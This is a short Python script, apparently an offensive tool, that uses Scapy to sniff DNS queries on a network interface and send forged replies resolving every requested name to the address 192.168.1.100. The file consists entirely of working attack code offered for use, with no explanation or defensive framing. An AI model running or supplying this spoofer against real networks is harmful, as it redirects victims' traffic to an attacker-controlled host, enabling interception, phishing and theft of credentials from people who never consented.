from scapy.all import *
import argparse

def spoof_dns(pkt):
    if pkt.haslayer(DNSQR):
        qname = pkt[DNSQR].qname.decode()
        print(f"[+] Intercepted DNS request for: {qname}")

        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                      UDP(dport=pkt[UDP].sport, sport=53) / \
                      DNS(id=pkt[DNS].id,
                          qr=1, aa=1, qd=pkt[DNS].qd,
                          an=DNSRR(rrname=qname, ttl=86400, rdata="192.168.1.100"))  # Your spoofed IP

        send(spoofed_pkt, verbose=0)
        print(f"[+] Sent spoofed DNS response to {pkt[IP].src} -> {qname} resolves to 192.168.1.100")

def main():
    iface = "eth0"  # change this to your interface
    print(f"[*] Starting DNS spoofing on {iface}...")

    sniff(filter="udp port 53", iface=iface, store=0, prn=spoof_dns)

if __name__ == "__main__":
    main()
